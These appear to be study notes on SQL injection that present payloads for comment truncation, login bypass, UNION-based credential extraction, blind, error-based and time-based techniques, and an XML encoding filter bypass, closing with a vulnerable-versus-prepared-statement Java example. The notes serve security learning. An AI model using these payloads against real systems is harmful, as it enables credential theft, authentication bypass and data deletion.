## Overview
SQL Injection (SQLi) occurs when user-controlled input is inserted into a SQL query without proper sanitization or parameterization, allowing attackers to manipulate the query.  
Most SQL injection vulnerabilities occur in the `WHERE` clause of a `SELECT` query, but they can exist in many other places.
### Common Injection Points:
- `WHERE` clause in `SELECT`
- `UPDATE` statements (values or conditions)
- `INSERT` statements (values)
- Table or column names in `SELECT`
- `ORDER BY` clause

---
## 1. Retrieving Hidden Data

```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```
- `--` comments out the rest of the query.
- This removes filtering conditions like `AND released = 1`.
### Using `OR 1=1`

```sql
SELECT * FROM users WHERE username = '' OR 1=1 --';
```
- `1=1` is always true → returns all rows.
- Dangerous in destructive queries:
```sql
DELETE FROM users WHERE username = '' OR 1=1 --'; //This deletes all records.
```

---
## 2. Subverting Application Logic

```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```
- Bypasses password check.
- Logs in as `administrator`.
---
## 3. UNION-Based SQL Injection

Used to extract data from other tables.
```sql
SELECT a, b FROM table1
UNION
SELECT c, d FROM table2;
```
### Requirements:
- Same number of columns
- Compatible data types
### Finding Number of Columns
##### Method 1: ORDER BY
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```
- Increase until error occurs.

##### Method 2: UNION NULLs
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```
- Match = no error
### Finding Column Data Types

```sql
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
```
- If no error → column accepts string.
### Extracting Data
```sql
' UNION SELECT username, password FROM users--
```

Concatenation:
```sql
' UNION SELECT username || '~' || password FROM users--
```
---
## 4. Examining the Database

### Get DB Version
- MySQL / SQL Server:
```sql
SELECT @@version
```

- Oracle:
```sql
SELECT * FROM v$version
```

- PostgreSQL:
```sql
SELECT version()
```
### List Tables
```sql
SELECT * FROM information_schema.tables
```
### List Columns
```sql
SELECT * FROM information_schema.columns
```
---
## 5. Blind SQL Injection

Occurs when:
- No output
- No error messages
### Boolean-Based
```sql
SELECT * FROM products WHERE id = 42 AND 1=1
SELECT * FROM products WHERE id = 42 AND 1=0
```
- Different response → vulnerable
### Data Extraction Example
```sql
xyz' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1) > 't
```
---
## 6. Error-Based SQL Injection

### Conditional Errors
```sql
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```
- If condition is true → triggers error

### Extracting via Errors
```sql
CAST((SELECT column FROM table) AS int)
```
- Forces type mismatch → leaks data in error
---
## 7. Time-Based Blind SQL Injection

Used when:
- No output
- No errors
```sql
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```
- Delayed response = TRUE
### Example:
```sql
'; IF (SELECT COUNT(username) FROM users 
WHERE username='administrator' 
AND SUBSTRING(password,1,1) > 'm') = 1 
WAITFOR DELAY '0:0:10'--
```
---
## 8. Out-of-Band (OAST)
- Uses external channels (DNS/HTTP)
- When no visible response exists  
    (Skipped for now)
---
## 9. Second-Order SQL Injection
- Input is stored first
- Later used unsafely in a query  
    Also called Stored SQL Injection
---
## 10. SQL Injection in Different Contexts
Injection can happen in:
- JSON
- XML
- Headers
### Example (XML encoding bypass):
```xml
<stockCheck>
  <productId>123</productId>
  <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
```
- `&#x53;` = `S` → bypass filters
---
## 11. Prevention

### Vulnerable Code
```java
String query = "SELECT * FROM products WHERE category = '" + input + "'";
Statement statement = connection.createStatement();
ResultSet resultSet = statement.executeQuery(query);
```

### Secure Code (Prepared Statements)
```java
PreparedStatement statement = connection.prepareStatement(
  "SELECT * FROM products WHERE category = ?"
);
statement.setString(1, input);
ResultSet resultSet = statement.executeQuery();
```
Prevents query structure manipulation

---
## Reference

- PortSwigger SQLi Cheat Sheet:  
    [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
---

